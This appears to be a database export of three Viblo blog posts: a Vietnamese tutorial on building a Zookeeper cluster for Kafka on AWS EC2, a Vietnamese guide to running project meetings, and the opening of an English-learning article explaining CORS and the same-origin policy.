<img loading="lazy" data-attachment-id="863" data-permalink="https://normanlimxk.com/kafka-ec2/" data-orig-file="https://normansdeepdive.files.wordpress.com/2021/11/kafka-ec2.png" data-orig-size="1288,471" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="kafka-ec2" data-image-description="" data-image-caption="" data-medium-file="https://normansdeepdive.files.wordpress.com/2021/11/kafka-ec2.png?w=300" data-large-file="https://normansdeepdive.files.wordpress.com/2021/11/kafka-ec2.png?w=1024" src="https://normansdeepdive.files.wordpress.com/2021/11/kafka-ec2.png?w=1024" alt="" class="wp-image-863" width="768" height="281" srcset="https://normansdeepdive.files.wordpress.com/2021/11/kafka-ec2.png?w=1024 1024w, https://normansdeepdive.files.wordpress.com/2021/11/kafka-ec2.png?w=768 768w, https://normansdeepdive.files.wordpress.com/2021/11/kafka-ec2.png?w=150 150w, https://normansdeepdive.files.wordpress.com/2021/11/kafka-ec2.png?w=300 300w, https://normansdeepdive.files.wordpress.com/2021/11/kafka-ec2.png 1288w" sizes="(max-width: 768px) 100vw, 768px">

Bài viết này mình sẽ trình bày khá chi tiết từng bước để có thể setup 1 cụm các server EC2 trên AWS chạy Kafka bao gồm 3 Zookeeper server và 3 Bootstrap server. Để đọc bài viết này, mình hy vọng bạn đã có chút kiến thức về AWS Cloud, Linux và Kafka. Nếu như chưa có thì cũng không sao, trong quá trình setup mình sẽ cố gắng giải thích tổng quan và cô đọng nhất có thể 😉.

Nói về kafka thì phải cần 1 series riêng để nói hết mớ lý thuyết của nó, trong phạm vi bài viết này chúng ta chỉ tập trung vào cách setup 1 cụm Kafka. Cho nên mình chỉ giới thiệu tổng quan 2 khái niệm chính và cần thiết trong bài viết này là Zookeeper và Kafka Bootstrap server. Các khái niệm khác bạn có thể đọc tại [đây](https://developer.confluent.io/what-is-apache-kafka/)
## Zookeeper là gì?
Zookeeper trong Kafka có thể hiểu đơn giản là một nơi quản lý, lưu trữ thông tin về cluster, bao gồm các broker, topic, partition và các metadata khác. Nó cũng cung cấp một bộ kiểm soát phiên bản để giúp cho việc quản lý và quản trị cluster Kafka một cách dễ dàng hơn. Với sự hỗ trợ của ZooKeeper, các nút trong một cluster Kafka có thể giao tiếp với nhau để quản lý các hoạt động như tăng hoặc giảm số lượng các broker, thêm hoặc xoá topic, v.v
## Setup Zookeeper trên AWS
Setup Zookeeper rất quan trọng vì hầu hết các cài đặt cấu hình đều được setup tại bước này, cho nên mình sẽ dùng cả bài viết này để setup nó một cách cẩn thẩn và chi tiết, còn phần sau mình sẽ setup 3 con server Kafka còn lại.
Đây là các bước mình sẽ thực hiện:
1. Tạo tài khoản AWS
2. Setup network security allow port 2181, 2888 và 3888
3. Setup VPC riêng cho cụm
4. Tạo ra 3 con instane EC2 (t2.medium 4gb ram)

Ở bước đầu tiên, các bạn có thể đọc tại [đây](https://docs.aws.amazon.com/accounts/latest/reference/manage-acct-creating.html) để tạo cho mình một tài khoản AWS.
Sau khi tạo thành công, các bạn vào EC2 service, đây là chính là nơi để khởi tạo các server

![image.png](https://images.viblo.asia/dac0cd9a-a78b-4952-ad66-d338bc0de0ba.png)

Bước tiếp theo mình sẽ tạo ra một security group để các server và máy mình có thể kết nối với nhau.
![image.png](https://images.viblo.asia/96446c5e-7405-4cce-89bf-17383a724ae1.png)

Security group giúp chúng ta bảo mật ở phạm vi instance, bước tiếp theo mình sẽ tạo thêm 1 VPC riêng để giúp cụm chúng ta bảo mật hơn ở phía subnet nhé.

Vào VPC service, chọn **Create VPC**, đặt tên tùy thích, ở đây mình đặt tên là my-kafka-vpc với IPv4 CIDR là
192.168.1.0/24. Vì cụm kafka của mình cần đến 6 server, do đó các bạn hãy chọn **region** nào có ít nhất 6 **AZ** nha, ở mỗi **AZ** sẽ được đặt 1 con **EC2**.

![image.png](https://images.viblo.asia/af28bdf3-928f-455b-88fe-6042607dc6cd.png)

 Tiếp theo, chúng ta vào **Subnets** tab chọn **Create Subnet** vào tạo ra 6 subnet tương ứng với mỗi AZ với các thông tin như bảng sau

 ![image.png](https://images.viblo.asia/e4b27bdb-a579-43cf-8303-5e5450e4bc06.png)

 Tạo 1 **Internet Gateway** và liên kết với VPC vừa tạo, gắn **Route table** trên từng Subnet vừa tạo. Điều này giúp chúng ta có thể connect ra bên ngoài.
![image.png](https://images.viblo.asia/e44dcc22-0eb1-44dd-8e22-65e417ac0a3a.png)

 ![image.png](https://images.viblo.asia/d825830d-f3c4-4b1a-9660-6b8d52dda0ad.png)

Sau đó chúng ta sẽ khởi tạo trước 1 instance EC2, lý do mình tạo trước 1 instance là bởi mình sẽ cài đặt cấu hình một lượt cho nó, sau đó chúng ta chúng ta chỉ cần tạo ra **AMI** trên instance vừa tạo để có thể tạo ra thêm các instance khác mà ở đó đã setup sẵn các cấu hình cho chúng ta.

Sau khi khởi tạo xong, các bạn có thể ssh vào nó, chú ý bạn phải đảm bảo rằng trong security group đã allow IP của bạn với port 22 nhé

Tiếp theo, mình cần phải setup các package và service cần dùng, các bạn chạy câu lệnh sau
```
# Packages
sudo apt-get update && \
      sudo apt-get -y install wget ca-certificates zip net-tools vim nano tar netcat

# Java Open JDK 8
sudo apt-get -y install openjdk-8-jdk
java -version
```
 Chú ý chúng ta cũng cần phải disable RAM Swap vì nó có thể gây lỗi

```
# Disable RAM Swap - can set to 0 on certain Linux distro
sudo sysctl vm.swappiness=1
echo ''vm.swappiness=1'' | sudo tee --append /etc/sysctl.conf
```

Để các server có thể gọi nhau một cách dễ dàng thì ở file hostname các bạn thêm dòng này sau đây
```
# Add hosts entries (mocking DNS) - put relevant IPs here
echo "<your-ip-address> kafka1
<your-ip-address> zookeeper1
<your-ip-address> kafka2
<your-ip-address> zookeeper2
<your-ip-address> kafka3
<your-ip-address> zookeeper3" | sudo tee --append /etc/hosts
```
Các chỗ <your-ip-address> các bạn tự thêm dùm mình các private ip của các server còn lại nha, ở ví dụ của mình, mình sẽ thêm 6 private ip lần lượt cho 6 con server còn lại của mình.


Ở các bước tiếp theo, chúng ta sẽ tải Zookeeper và kafka về server

```
# download Zookeeper and Kafka. Recommended is latest Kafka (0.10.2.1) and Scala 2.12
wget https://archive.apache.org/dist/kafka/0.10.2.1/kafka_2.12-0.10.2.1.tgz
tar -xvzf kafka_2.12-0.10.2.1.tgz
rm kafka_2.12-0.10.2.1.tgz
mv kafka_2.12-0.10.2.1 kafka
cd kafka/
```

Sau khi đã hoàn tất việc download, chạy thử zookeeper xem sao (chú ý tất cả các file cấu hình được được đặt trong folder config được cho sẵn bởi kafka nhé).
```
# Testing Zookeeper install
# Start Zookeeper in the background
bin/zookeeper-server-start.sh -daemon config/zookeeper.properties
bin/zookeeper-shell.sh localhost:2181
ls /
```
Khi màn hình xuất hiện như vậy thì chúng ta đã chạy thành công zookeeper trên server rồi
![image.png](https://images.viblo.asia/60b8ead9-1d2d-436f-ab3b-2dc030d9fdac.png)
 Nhưng chạy như thế này thì không ổn, chúng ta cần setup lại một xíu để có thể khởi động hoặc dừng nó như một service chạy ngầm

 Các bạn hãy chạy câu lệnh dưới đây
```
# Install Zookeeper boot scripts
sudo nano /etc/init.d/zookeeper
sudo chmod +x /etc/init.d/zookeeper
sudo chown root:root /etc/init.d/zookeeper

# you can safely ignore the warning
sudo update-rc.d zookeeper defaults
```
Với lệnh nano bạn hãy copy content từ file theo đường dẫn [/zookeeper/zookeeper](https://github.com/quocthinh861/kafka-zookeeper-cluster/blob/main/zookeeper/zookeeper) trong repo của mình,
Sau khi chạy thành công, có bạn có thể start service bằng lệnh


```
sudo service zookeeper start
```
Để chứng minh service đang được chạy, chạy câu lệnh `nc -vz localhost 2181`

![image.png](https://images.viblo.asia/e44a7cb9-cac2-40ce-9086-7bb2c5a8b524.png)

Và để tắt service chúng ta chạy `sudo service zookeeper stop`

![image.png](https://images.viblo.asia/2ba505cb-b9c6-4e50-bc43-50e08dbf6ac6.png)

Mình dùng câu lệnh `nc -vz localhost 2181` để kiểm tra xem service có hoạt động hay không, thì có thể thấy rằng việc setup service đã thành công. Như vậy chúng ta đã chính thức setup được 1 server chạy Zookeeper rồi Việc tiếp theo chúng ta sẽ tiến thành clone nó để tạo ra thêm 2 server cấu hình y chang vậy nữa.

## Setup cụm Zookeeper
Trước tiên, chúng ta cần tạo AIM từ Instance trước đó. Tạo ra thêm Instance và khởi động Zookeeper service.
Dừng instance đang chạy, vào mục **Action** ấn chọn **Create image**.
    ![image.png](https://images.viblo.asia/36d3e89b-8305-4dfb-b37f-0c8ac68cbc53.png)

   Sau khi đã tạo AIM xong, chúng ta có thể khởi tạo lại các instance với những cấu hình đã setup sẵn, chú ý trong phần network, mục **Primary IP**, các bạn có thể chọn private ip tùy thích phù hợp với IP4 block của subnet bạn chọn (lưu ý địa chỉ này chính là ip host trong tập tin /etc/hosts ở trên)


![image.png](https://images.viblo.asia/058fe0ef-9d6d-4bbe-948e-7cea47d04541.png)



 Vậy là chúng ta đã có 3 instance chạy Zookeeper rồi, nhưng trước hết cần kiểm tra kết nối giữa 3 con này để xác định xem Network chúng ta setup trước đó có đúng hay không. Đầu tiên cần SSH vào cả 3 con server. Như lần kiểm tra ở trên bằng cách sử dụng `nc -vz localhost 2181` thì lần này mình sẽ thay localhost thành lần lượt các hostname trong cụm. Ví dụ mình ssh vào con zookeeper1 vào chạy lệnh `nc -vz zookeeper2 2181`, kết quả trả về:

  ![image.png](https://images.viblo.asia/40fd5a50-f39f-4678-a2b6-2ed7ad199f76.png)

Vậy là việc setup network và config cụm của chúng ta đã gần như hoàn thành. Việc tiếp theo là setup thư mục cũng như kiểm tra cụm có hoạt động tốt hay không 😇.

Tại thư mục Kafka, file cấu hình Zookeeper được đặt trong kafka/config/zookeeper.properties, nội dung sau đây
```
dataDir=/data/zookeeper
clientPort=2181
maxClientCnxns=128
initLimit=10
syncLimit=5
tickTime=6000
server.1=<zookeeper_1_IP>:2888:3888
server.2=<zookeeper_2_IP>:2888:3888
server.3=<zookeeper_3_IP>:2888:3888
```
Mỗi Zookeeper phải có đường dẫn /data/zookeeper như đã cấu hình cho dataDir ở trên, cho nên chúng ta sẽ tạo ra đường dẫn cũng như thay đổi user role cho nó
```
# create data dictionary for zookeeper
sudo mkdir -p /data/zookeeper
sudo chown -R ubuntu:ubuntu /data/
```

  Đối với mỗi Zookeeper trong cụm, cần có 1 file là myid chữa 1 ID riêng biệt. Đối với Zookeeper 1:
```
echo "1" > /data/zookeeper/myid
```
Còn Zookeeper 2 và 3 thực hiện tương tự (lưu ý thứ tự cần giống với thứ tự server trong file config).

Vậy là việc setup cụm đã xong, bây giờ check thử xem tụi nó có làm việc với nhau hay chưa. Các bạn chạy shell trên zookeeper 1 `bin/zookeeper-shell.sh zookeeper1:2181` chạy câu lệnh **create /my-node "testing"**

   ![image.png](https://images.viblo.asia/0568456f-dc11-49ba-bf12-6947d33dc14f.png)
Sau khi tạo node trên zookeeper 1 vào thử shell zookeeper 2 xem có node vừa tạo không

   ![image.png](https://images.viblo.asia/50cdccb0-1675-4a38-8ee3-ed32f525eb31.png)

  Có thể thấy rằng my-node cũng đã được tạo trong zookeeper 2. Các bạn cũng có thể chạy câu lệnh `echo stat | nc <hostname> <port>` . Điều này sẽ hiển thị trạng thái hiện tại của cluster ZooKeeper, bao gồm thông tin về các khách hàng đã kết nối, số lượng nút sống và nhiều hơn nữa. Nếu kết nối giữa các máy chủ là hoạt động tốt, bạn sẽ thấy một thông tin cho biết rằng kết nối đang hoạt động và cluster đang hoạt động bình thường. Trong ví dụ của mình

   ![image.png](https://images.viblo.asia/464eb163-a398-469c-ac94-9057a96ea39f.png)

Vậy chúng ta đã setup cấu hình thành công cho cụm Zookeeper. Phần tiếp theo sẽ tạo tiếp cụm Kafka và thực hành trên toàn bộ cụm nhé. Good bye and good luck 😘

## Tham khảo

https://unixcop.com/kafka-and-zookeeper-ha-cluster-setup/

https://www.clairvoyant.ai/blog/kafka-series-3.-creating-3-node-kafka-cluster-on-virtual-box?hs_amp=true

https://normanlimxk.com/2021/11/01/setup-a-kafka-cluster-on-amazon-ec2/', '2023-02-09T01:57:00.000000Z', '2023-02-27T01:30:06.000000Z', '2023-02-09T02:04:04.000000Z'),
	('[PMStarter] Làm sao tổ chức meeting hiệu quả', 'aAY4qRYyJPw', '7', 'public', 'https://images.viblo.asia/7f924e19-5cfa-4528-822c-437dc1fd0dd1.jpeg', 'Trong hình dung của một số tổ chức thì Project Manager (PM) thường là ... thư ký, ... thợ book phòng🙂 ! Việc thường nhật của PM thường là theo dõi công việc (monitor task list),  đi tìm phòng họp, gửi lịch họp, đi nhắc task. Ở tổ chức trước đó mình làm thì thường có chức danh Project Coordinator hay Project Specialist, mình cũng từng làm qua các vị trí tương tự, những việc tưởng chừng rất nhỏ n...', 'Trong hình dung của một số tổ chức thì Project Manager (PM) thường là ... thư ký, ... thợ book phòng🙂 ! Việc thường nhật của PM thường là theo dõi công việc (monitor task list),  đi tìm phòng họp, gửi lịch họp, đi nhắc task. Ở tổ chức trước đó mình làm thì thường có chức danh Project Coordinator hay Project Specialist, mình cũng từng làm qua các vị trí tương tự, những việc tưởng chừng rất nhỏ như đến tận bàn làm việc nhắc các member đi họp hay đi gọi nước cho phòng họp. Đến với tổ chức mới, khi ngồi trò chuyện với bạn PM nhỏ tuổi hơn thì cũng thường nghe những lời than như "ở đây mình chỉ quản lý được cái task list", "PM ở đây chỉ book meeting thôi", ... Thường trước đó mình cũng hay có suy nghĩ tiêu cực giống vậy, cho đến khi đi học thêm về các chứng chỉ PM, trao đổi thêm với các PM coach thì mình đút kết được: Nhiệm vụ của PM là đảm bảo meeting cần phải được diễn ra và điều phối được meeting của dự án.

![](https://images.viblo.asia/8bd4b7a7-578f-460e-84f1-9d65c3af1868.png)

# A/ Nâng tầm lên thành một sứ mệnh
Thống kê chỉ ra rằng 80% thời gian trong ngày của một PM là ... trao đổi (communication). Các số liệu dự án cũng đồng thuận rằng  việc trao đổi trực tiếp (In person) mang lại hiệu quả cao nhất khi thực hiện dự án. Nên việc tổ chức meeting gần như trở thành một kỹ năng thiết yếu cho các bạn theo nghề Project. Nên thay vì khó chịu vì việc phải đi họp thì việc mình hay làm là thay đổi suy nghĩ về việc meeting: mình cần gắn kết mọi người lại với nhau, vì đó là trách nhiệm, là sứ mệnh của một PM, là hướng tới dự án thành công và một team hiệu quả. Nên điều người PM cần làm không chỉ tổ chức meeting mà phải đảm bảo mọi người đều phải họp, đảm bảo thông tin được thông suốt.

![](https://images.viblo.asia/51e414ba-dfad-47cb-af8f-97b02e4718ae.jpg)

# B/ Làm sao để meeting trở nên hiệu quả
Tùy thuộc vào mindset và quy định của từng team dự án mà meeting sẽ có chủ đề & các dạng khác nhau. Đa số các dự án tech mình theo thường sẽ thường bị than thở kiểu "Họp nhiều quá", "Tốn thời gian quá", "Ủa rồi họp hoài ai làm đây". Nên thường mình hay chia sẻ với team PM: "Khi mình meeting thì cần phải hiệu quả" . Vậy hiệu quả là sao ?

## B.1/ Goals - Mục đích - Họp cần có mục đích
Meeting sẽ lãng phí khi ta không xác định được mục đích của meeting là gì.
Cơ bản PM cần làm bài tập trước khi họp ví dụ
- Các chủ đề cần họp, ai sẽ làm người tham gia ? Vai trò của người tham gia là gì ? Có những thông tin và action gì cần xác định sau meeting không ? Để từ đó xác định được lịch trình (Agenda) và Đối tượng họp (Target audience) của mình trong meeting
- Nếu mình là người được mời, thì ai là người đang chủ trì meeting ? Mục đích tham gia của mình trong meeting là làm gì ? Mình có cần chuẩn bị gì trong meeting không ?

## B.2/ Invitation - Gửi thư mời - Thư mời họp là bước khởi đầu
Không biết với mọi người thì sao chứ thường mình phải take khá time cho việc này. Thường mình soạn nội dung khá nhanh. Nhưng thường sẽ dành 20'' - 30'' để review meeting invitation thật kỹ rồi mới bấm nút "SEND"
Quan điểm của mình, một PM cần chỉnh chu về câu chữ và các thành văn. Hãy đặt mình vào vị trí của một khách mời để chỉnh chu nội dung thư mời của mình
- Nội dung & lịch trình họp: Khách mời họp cần biết họ đi họp vì chuyện gì. Lịch trình sẽ gồm những chủ đề nào. Để họ có thể thu xếp về mức độ quan trọng và mời thêm các bên liên quan nếu cần
- Địa điểm và thời gian thuận tiện: Đối với những khách mời được PM target là bắt buộc thì mình nên check calendar họ trước, hoặc khách mời nào high level hơn thì nên tới bàn remind họ về chuyện đi họp. Để đảm bảo rằng họ sẽ tham gia meeting. Về địa điểm mình sẽ đề cập rõ hơn trong phần Space
- Nếu là meeting có liên quan tới propose một vấn đề gì đó hoặc là round 2 của một topic trước đó thì nên đính kèm tài liệu hoặc meeting notes  trước đó  để khách mời có thời gian tham khảo trước
- Nếu phần họp có online lẫn offline thì cũng nên ghi rõ để khách mời có thể dễ dàng tham dự (tùy thuộc target audience)

Trên là nội dung, sau khi draft nội dung xong, mình thường review thêm vài điểm nữa
- Lỗi chính tả: Đây là lỗi cơ bản, cũng là thường gặp nhất. Người đọc dễ đãi thường sẽ bỏ qua, nhưng một PM chỉnh chu thì mình nên khác biệt nhỉ🙂
- Đã đủ khách mời chưa, địa chỉ email đã đúng chưa: Có nhữnng chuyện bi hài xung quanh việc mời sai người. Cho nên chẳng bao giờ thừa khi mình check lại thêm lần nữa
- Thời gian & địa điểm đã chính xác chưa ? Đường link online liệu có truy cập được ?
- File đính kèm đã có chưa ? Liệu có mở được ?

Sau đó, bấm "SEND" và ... check lại thử trong thư mụ SENT để chắc là email đã được gửi, chứ có khi email vẫn còn nằm trong "OUTBOX" đó nhé.

![](https://images.viblo.asia/b2b741d7-3a72-488c-aef8-8354bfd998bb.jpg)

## B.3 / Space - Không gian - Hãy chọn 1 địa điểm phù hợp với meeting của bạn
Nói dân gian là đi book phòng họp. Việc mà đa số PM cho là việc ... admin. Khi mới vào tổ chức mới, với cương vị là PM thì task đầu tiên mình làm trong ngày đầu onboard là ... đi coi phòng họp😄 ! Và tìm hiểu về hệ thống booking meeting room.
PM mảng Tech theo tinh thần Agile luôn phải đặt mình trong tâm thế: Sẽ cần đi họp bất cứ lúc nào, nên việc book phòng mà còn phải cậy nhờ thì ... sẽ hơi căng. Tất nhiên nếu chúng ta có bạn thư ký dự án xinh đẹp lo việc này thì tất nhiên là vô ưu rồi :))).
Mình không dùng từ "Room" mà thay vào đó là "Space", vì thực chất chúng ta có thể meeting bất cứ lúc nào. Việc PM là cần làm là lúc nào thuận tiện, bất cứ chỗ nào có đủ không gian cho member thì có thể sẵn sàng cho việc họp. Ở tổ chức mới của mình là công ty công nghệ, nên hầu như các bạn team member có thể họp bất cứ lúc nào. Đó cũng là điều mình thích ở công ty hiện tại. Nhưng là một PM chỉnh chu, tất nhiên chúng ta cũng cần vài chiến thuật cho không gian họp
- Đối với nhóm nhỏ (dưới 5 người)
	- Mục tiêu là catch up / sync công việc và đôi khi là make decision nhanh nên có thể đến ngay chỗ bàn làm việc xong đứng họp luôn, vẫn ổn nha. Standup vài phút mỏi chân có khi sẽ giúp mình quyết định nhanh hơn😄 (theo concept của DSM - Daily Standup Meeting)
	- Hãy nhớ mang theo máy tính theo, nếu cần minh họa và note lại vấn đề chia sẻ ngay và luôn. Để đảm bảo chất lượng meeting
	- Dù là nhỏ nhóm, ở góc nào đó hoặc bàn làm việc thì ... cũng cần riêng tư và tránh làm phiền người khác. Nên có thể kiếm 1 góc phòng hoặc 1 bàn tròn ở pantry. Điều chỉnh âm lượng để tránh làm phiền và thông tin bị rò rỉ nếu quá đông người
- Đối với nhóm lớn hoặc meeting mang tính quan trọng hoặc có đối tượng quan trọng
	- Xác định số lượng người là yếu tố tiên quyết. Bạn sẽ không muốn khách mời mình phải đứng hoặc tự đi tìm ghế , có khi làm trễ thời gian họp. Hãy tìm hiểu phòng họp trước, như số lượng người. Đi xem phòng trước cũng là một cách nếu bạn chưa quen thuộc
	- Máy chiếu / TV: Trình chiếu là phần không thể thiếu trong meeting. Nếu meeting yêu cầu trình chiếu thì đây sẽ là điều kiện bắt buộc. Hãy chắc là phòng họp bạn đặt có thể trình chiếu nhé, và quan trọng hơn là laptop của bạn connect được với nó nữa. Bạn nên thử kết nối trước với phòng họp dó để còn có buffer time để request đội HelpDesk hỗ trợ
	- Bảng/ Bút lông: Đối với các buổi brainstorming thì bảng và viết là cần thiết nhé. Đa số các buổi brainstorm mình host mà sử dụng máy chiếu hay TV đều không work. Với việc đứng ở board và viết sẽ dễ thu hút sự chú ý của member hơn
	- Cuối cùng là ... đến sớm. Mình thường có mặt setup mọi thứ trước tầm 10''
		- Mở đèn, kết nối máy chiếu, order nước (nếu có high level)
		- Join meeting online, bật sẵn ghi âm, mở sẵn notes để ghi chú. Thường mình còn mang theo 1 màn hình phụ (extend display) để đảm bảo có thể làm việc ở private mode được khi trình chiếu
		- Tắt các trình chat messenger hoặc email notication nếu bạn share cả màn hình. Đây là điều mình tối kỵ, mình hay gặp các case bi hài với những tin nhắn popup lên trong lúc present
		- Cuối cùng là ... last minute call. Gửi 1 mess để nhắn các member là meeting đang diễn ra. Double check lại lần nữa là các key member trong meeting sẽ tham dự
Tin mình đi, một phong cách chỉnh chu, một không gian thoải mái sẽ giúp khách mời / member ấn tượng và meeting nhẹ nhàng hơn nhiều

## B.4/ Interaction - Tương tác - Phải kiểm soát được nhịp tương tác trong meeting
Hãy đảm bảo tất cả các thành viên được nói. Nếu PM định buổi đó chỉ để report hoặc chỉ đơn giản muốn thông tin với 1 hoặc nhóm đối tượng cụ thể thì có thể consider xem chuyển sang catch up trực tiếp hoặc gửi report thay vì tổ chức đi họp. Mà thật ra đối với nhóm nhỏ thì PM cũng cần giữ tương tác với các member. Mỗi target member đều cần được tương tác, hay lấy ý kiến. Tùy thuộc vào dạng của meeting mà sẽ có những kiểu tương tác khác nhau
- Brainstorm: Raise problem và open discussion, lấy ý kiến các bên. Thông thường các buổi này mình sẽ dùng board, và mời từng thành viên lên góp ý kiến. Sau đó quan sát và dùng các kỹ năng mềm (interpersonal skill) để giữ tương tác với các member
- Presentation: Có phẩn Q&A hoặc open discussion với mọi người. Đối với dạng này, nếu mình là người trình bày thì cần quản lý thời gian và quan sát khán giả của mình. Thường mình sẽ cố gom chủ đề khá ngắn dưới (10 min) sau đó sẽ là Q&A hoặc lấy ý kiến vì không để lâu thì member có dấu hiệu ... chán. Hãy hỏi thăm từng người để đảm bảo là mọi người đều có tiếng nói trong meeting nhe
Xung đột trong meeting thường là chuyện không tránh khỏi. PM sẽ cần kỹ năng giải quyết xung đột để xử lý. Mình sẽ không chi tiết trong bài viết này. Nhưng tổng quan thì PM sẽ phải kiểm soát được tình hình và đưa meeting theo chiều hướng có kết quả tốt nhất là được

![](https://images.viblo.asia/7cb3aa6f-c31f-4c07-a540-90c2851986f7.jpg)

## B.5/ Time-box - Giới hạn thời gian - Đúng giờ ! Tránh lãng phí thời gian của nhau
Đi họp luôn bị chê là công việc tốn quá nhiều thờ gian. Nên kỹ năng của PM là quản lý thời gian trong meeting. Hãy chắc rằng meeting của bạn đừng quá dài và có thời gian cố định, đặc biệt là những buổi brainstorm thường không có dấu hiệu dừng nếu bắt đầu có xung đột với nhau.

Hãy time-box cho chủ đề của bạn: Có thể  báo với các member hoặc ghi trong agenda về time-box.  Thường tối đa cho các meeting mình sẽ đặt vào khoảng 2 hours, các phần present thì khoảng 30m, 1 hour cho các thể loại discussion. Nếu quá time thì mình sẽ điều phối và kết luận sớm. Nếu cần lấy ý kiến thống nhất thì mình sẽ đề xuất team voting để có hướng giải quyết vấn đề tạm trong thời gian đó

Việc quản lý thời gian meeting thường khá khó, mình cũng phải làm vài lần mới quen được :)

## B.6/ Conclusion - Tổng kết - Chốt meeting và đóng gói thông tin , đưa ra kết luận
Meeting đi liền với mục đích thì chắc chắn sẽ cần kết luận. Cả khi bạn không có được giải pháp cuối cùng thì việc tổng kết lại thời gian thảo luận vẫn là cần thiết
- Hãy chắc là bạn có note các ý chính trong meeting, và cần thành văn để trình bày lại nó với team. Để chắc là không thông tin quan trọng nào bị bỏ lỡ và bị hiểu sai
- Nếu đó là buổi presentation thì bạn cần 1 slide tổng kết để chốt vấn đề trong meeting đấy
- Nếu buổi cần action plan thì việc ghi next action và nêu tên PIC là cần thiết để kêu gọi sự đồng thuận cùng làm (commitment)
- Nếu là buổi ra quyết định thì cần nhấn mạnh lại giải pháp lần nữa và kèm kế hoạch thực hiện cùng các member

Đây là session quan trọng nhất, và mang hiệu quả nhất trong meeting. Hãy chắc rằng bạn có chiến thuật khi thực hiện nó nha

## B.7/ Recap / Notes - Ghi chú - Thông tin cần ghi nhớ, hành động cần thực hiện
Cuối cùng là notes. Mình thấy trên mạng có nhiều khái niệm như meeting notes, meeting minutes, recap, ... Cơ bản mình cũng không muốn phân biệt nó trong bài viết này :D. Theo mình thì miễn bạn đảm bảo các member có thể access được thông tin sau meeting là đã WIN rồi. Còn đây là kinh nghiệm của cá nhân mình
- Thường các meeting liên phòng ban cần thông tin chính thống và đóng dấu (sign off) thì mình sẽ format theo khung thời gian ví dụ session này tầm nhiêu phút và ai chủ trình, nội dung thống nhất. Xong các bên sign off vô. Mục tiêu: Các thông tin cần được confirm và rõ ràng
- Các buổi meeting cần action nhanh thì mình chỉ note ý và kèm action plan (ai làm gì, ngày kết thúc). Mục tiêu là có quick action để team có thể process
- Các buổi brainstorm: Vi thường kèm hình vẽ (ghi trên board) và các thông tin mindmap. Các ý tưởng nháp, sự đồng thuận. Mục tiêu để team có thể tra cứu lại khi cần
Sau cùng là gửi / lưu trữ ở nơi team có thể access được là ổn :)

![](https://images.viblo.asia/862bbebb-934f-4366-9930-30d70e33a9a5.jpg)
# C/  Kết luận
Gửi lời cám ơn đến các bạn đã đọc bài notes dài như vậy😄 ! Trên là những ý kiến và kinh nghiệm cá nhân của mình theo con đường trở thành 1 PM.  Việc meeting cơ bản như năng lực bắt buộc của 1 PM, quan điểm cá nhân mình là nếu mình cảm thấy việc mình làm quan trọng thì tự nhiên việc đó sẽ trở nên không tầm thường. Vì 80% thời gian của PM là trao đổi thông tin nên hãy lên cho mình chiến thuật meeting sao cho mình thấy nhẹ nhàng và hiệu quả là được nha🙂', '2023-02-08T23:26:27.000000Z', '2023-02-28T05:00:16.000000Z', '2023-02-08T23:21:48.000000Z'),
	('Blog#135: Say goodbye to the pain called CORS!👋🏼', '018J2v2eJYK', '8', 'public', 'https://images.viblo.asia/2c7ba2d8-ff7b-4760-a31b-bb135bfa905e.png', '

The main goal of this article is to help you improve your English level. I will use Simple English to introduce to you the concepts related to software development. In terms of IT knowledge, it might have been explained better and more clearly on the internet, but remember that the main target of this article is still to LEARN ENGLISH.

Hi, I''m Tuan, a Full-stack Web Developer from Tokyo 😊.
F...', '![image.png](https://images.viblo.asia/2c7ba2d8-ff7b-4760-a31b-bb135bfa905e.png)

> The main goal of this article is to help you improve your **[English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** level. I will use **[Simple English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** to introduce to you the concepts related to software development. In terms of IT knowledge, it might have been explained better and more clearly on the internet, but **remember** that the main target of this article is still to **[LEARN ENGLISH](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)**.
-----
Hi, I''m [Tuan](https://tuan-portfolio.web.app/#/), a Full-stack Web Developer from Tokyo 😊.
Follow my blog to not miss out on useful and interesting articles in the future.

![image.png](https://images.viblo.asia/106365c0-6edb-46c5-91eb-40f913dfaabf.png)

When you are writing code for an application, this bug can happen more often than it should. Every time it happens, people have the same reaction.

![image.png](https://images.viblo.asia/3e3e7a76-9aa6-4488-9cb4-e8e949d726d6.png)

# Fix one: install the Allow-Control-Allow-Origin plugin
To fix your problem quickly, you can install the [moesif CORS extension](https://chrome.google.com/webstore/detail/moesif-orign-cors-changer/digfbfaphojjndkpccljibejjbppifbc?hl=en-US). Once it is installed, click on the icon in your browser to turn it on. The label on the icon should change from "off" to "on".

Press the refresh button on your application and your API requests should work now! Yay!🎉

# But the plugin fix is deceiving

The plugin can help you fix the problem on your own computer, but it won''t work for other people who use your application. It wouldn''t be a good idea to ask them to install the plugin. We need to find a better solution, so let''s think about some questions.

# Why was the CORS error there in the first place?

The **same-origin policy** prevents malicious websites from accessing the cookies associated with other domains.

The **same-origin policy** is a security measure that browsers use to protect you from cyber attacks. It stops malicious websites from taking advantage of the cookies stored in your browser to access information from other websites.

![image.png](https://images.viblo.asia/3ed3b07f-380d-4f0d-9232-3990b39297a9.png)

Every time you come back to the `facebook-clone.com` tab, you don''t have to sign in again! It''s like magic! The website remembers you and you can just keep on clicking around the app.

Uh oh! You clicked on a tricky popup ad and now you''re in trouble! You''ve been taken to a website called `evil-site.com` and your browser has automatically given it all your cookies! That''s not good!

![image.png](https://images.viblo.asia/75222a13-9474-4bbf-a2e2-38f457047607.png)

The bad guys tricked your browser into giving them access to your account on facebook-clone. It''s like they tricked your browser into giving them the key to your house!

The browser is like a hawk, ready to swoop in and protect us from evil-site. It won''t let evil-site do anything bad, and it will give it a big "NO!" 🕶️

# How does the same-origin policy work under the hood?

The browser is like a detective, checking to make sure the web application and server are who they say they are. It looks at the combination of the website''s address, the the hidden port number and the type of connection (like https). For example, if you go to `www.facebook-clone.com`, the detective looks at the address, the the hidden port number (`443`) and the type of connection (`https`) to make sure everything is in order.

